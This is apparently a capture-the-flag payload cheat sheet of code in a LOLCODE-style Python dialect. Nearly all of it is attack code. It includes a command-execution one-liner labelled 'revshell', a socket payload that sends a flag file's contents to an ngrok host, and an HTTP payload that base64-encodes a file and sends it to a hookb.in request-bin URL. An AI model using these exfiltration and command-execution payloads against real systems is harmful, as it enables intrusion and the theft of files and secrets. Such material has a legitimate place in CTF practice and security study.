## Python lolcode
Simple 
```
IN MAI os GIMME system LIKE exc F CAN HAS exc WIT "revshell"
```
Execute Commands (scoket)
```
GIMME socket 
GIMME os
sock CAN HAS socket OWN socket THING BTW WIT socket.AF_INET AND socket.SOCK_STREAM! 
host CAN HAS "6.tcp.ngrok.io"
port CAN HAS 11064
data CAN HAS os OWN popen WIT "cat /opt/challenge/flag.txt "! OWN read THING
sock OWN connect WIT WIT host AND port!!
sock OWN send WIT data OWN encode THING !
```
Execute Commands (http)
```
GIMME os
GIMME urllib2
GIMME base64

cmd CAN HAS 'cat /opt/is/flag/for/me/flag.txt > out.txt'

os OWN system WIT cmd!

RF CAN HAS open WIT 'out.txt'!
RR CAN HAS RF OWN read THING

MB CAN HAS RR OWN encode WIT 'ascii'!
B64 CAN HAS base64 OWN b64encode WIT MB!

urllib2 OWN urlopen WIT 'https://hookb.in/QJ2NJ3NNaOC8mNzzlM08?flag=' ALONG WITH B64!
```
Read a local file
```
F CAN HAS open WIT "/flag.txt"!
S CAN HAS F OWN read THING
VISIBLE S
```